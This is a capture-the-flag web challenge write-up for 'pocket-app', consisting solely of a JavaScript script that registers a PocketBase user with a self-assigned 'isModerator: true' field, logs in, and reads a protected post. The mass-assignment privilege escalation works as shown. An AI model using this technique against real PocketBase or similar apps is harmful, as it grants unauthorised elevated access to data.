# Write-up: pocket-app

## Category: web

## Author tomek7667

```js
import PocketBase from "pocketbase";

const pb = new PocketBase("https://pocket-app.knping.pl");

const data = {
	username: "test_username",
	email: "test@example.com",
	emailVisibility: true,
	password: "12345678",
	passwordConfirm: "12345678",
	name: "test",
	isModerator: true,
};
try {
	await pb.collection("users").create(data);
} catch (e) {}
await pb.collection("users").authWithPassword("test@example.com", "12345678");
const record = await pb.collection("posts").getOne("3gn82foncdvqih7");
console.log(record.content);
pb.authStore.clear();
```
